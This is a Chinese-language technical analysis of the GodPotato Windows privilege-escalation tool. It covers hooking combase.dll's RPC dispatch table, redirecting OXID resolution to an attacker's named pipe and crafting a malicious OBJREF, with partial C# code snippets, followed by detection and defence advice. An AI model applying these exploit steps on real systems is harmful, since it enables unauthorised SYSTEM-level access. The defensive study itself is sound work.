项目概述

GodPotato是基于DCOM/COM机制的Windows本地提权工具。其核心创新在于直接Hook RPC运行时库(combase.dll)中的函数，控制OXID解析过程，诱导RPCSS服务连接到攻击者的命名管道，实现权限提升。

技术特点
  • 直接Hook系统DLL，不依赖特定服务行为
  • 利用DCOM基础设施的信任关系
  • 结合令牌枚举实现完整权限提升
  • 适用Windows 2012-2019, Windows 8-10

Hook实现

public void HookRPC() { uint old; // 修改内存保护为可读写 VirtualProtect(DispatchTablePtr, (uint)(IntPtr.Size * dispatchTable.Length), 0x04, // PAGE_READWRITE out old); // 替换第一个函数指针 Marshal.WriteIntPtr(DispatchTablePtr, Marshal.GetFunctionPointerForDelegate(useProtseqDelegate)); IsHook = true; }
VirtualProtect

  • size: 内存块大小
  • newProtect: 新保护属性(0x04 = PAGE_READWRITE)
  • oldProtect: 原保护属性输出

OXID解析机制

什么是OXID解析

OXID(Object Exporter ID)是DCOM中用于定位对象所在进程的标识符。当客户端需要连接到远程DCOM对象时，需要通过OXID解析器获取对象的绑定信息(协议序列和网络地址)。

OXID解析流程
  1. 客户端从OBJREF中提取OXID
  2. 调用RPCSS服务的OXID解析接口
  3. RPCSS查找OXID对应的绑定信息
  4. 返回DualStringArray(包含协议和地址)
  5. 客户端使用绑定信息连接对象

自定义端点解析

当Hook生效后，RPCSS调用被替换的函数获取绑定信息：

public int fun(IntPtr ppdsaNewBindings, IntPtr ppdsaNewSecurity) { // 构造自定义端点列表 string[] endpoints = { godPotatoContext.clientPipe, // 攻击者管道 "ncacn_ip_tcp:fuck you !" // 无效TCP端点 }; // 构造DualStringArray IntPtr pdsaNewBindings = Marshal.AllocHGlobal(memroySize); // 写入端点绑定信息 for (int i = 0; i < endpoints.Length; i++) { // 写入协议序列和网络地址 Marshal.WriteInt16(pdsaNewBindings, offset, ...); } // 返回结果 Marshal.WriteIntPtr(ppdsaNewBindings, pdsaNewBindings); return 0; // 成功 }

协议序列 值 说明

EPM_PROTOCOL_NAMED_PIPE 0x10 命名管道
EPM_PROTOCOL_NCALRPC 0x0c 本地RPC

OBJREF结构详解

OBJREF格式

OBJREF是DCOM对象引用的序列化格式，包含对象位置和绑定信息。

OBJREF头部
const uint Signature = 0x574f454d; // "MEOW" enum Type : uint { Standard = 0x1, // 标准对象引用 Handler = 0x2, // 处理器对象引用 Custom = 0x4 // 自定义对象引用 }
STDOBJREF结构
struct Standard { uint Flags; // 标志位 uint PublicRefs; // 公共引用计数 ulong OXID; // 对象导出器标识符 ulong OID; // 对象标识符 Guid IPID; // 接口指针标识符 DualStringArray; // 绑定信息数组 }

构造恶意OBJREF

// 获取原始OBJREF模板 moniker.GetDisplayName(bindCtx, null, out ppszDisplayName); byte[] objrefBytes = Convert.FromBase64String(...); // 构造恶意OBJREF ObjRef objRef = new ObjRef(IID_IUnknown, new ObjRef.Standard(0, 1, oxid, oid, ipid, new ObjRef.DualStringArray( new ObjRef.StringBinding(TowerProtocol.EPM_PROTOCOL_TCP, "127.0.0.1"), new ObjRef.SecurityBinding(0xa, 0xffff, null)))); // 触发解组 UnmarshalDCOM.UnmarshalObject(data, out ppv);
CoUnmarshalInterface
使用流中的数据初始化代理对象，触发OXID解析过程。

安全警告：使用不可信数据调用此方法是安全风险！

防御与检测

检测方法

检测点 方法 特征

VirtualProtect调用 监控关键DLL内存保护修改 将只读内存改为可写

防御措施

建议防御措施
  1. 部署代码完整性保护，防止DLL内存修改
  2. 实施内存完整性监控，检测关键DLL修改
  3. 严格限制SeImpersonatePrivilege权限分配
  4. 监控NtQuerySystemInformation等敏感API
  5. 部署EDR解决方案，检测异常行为模式
  6. 审计服务账户权限配置

权限要求说明

SeImpersonatePrivilege权限

该权限是成功执行此攻击的关键前提。以下账户通常拥有此权限：

  • Administrators组
  • LOCAL SERVICE
  • NETWORK SERVICE
  • SERVICE组
  • IIS应用程序池账户
  • SQL Server服务账户
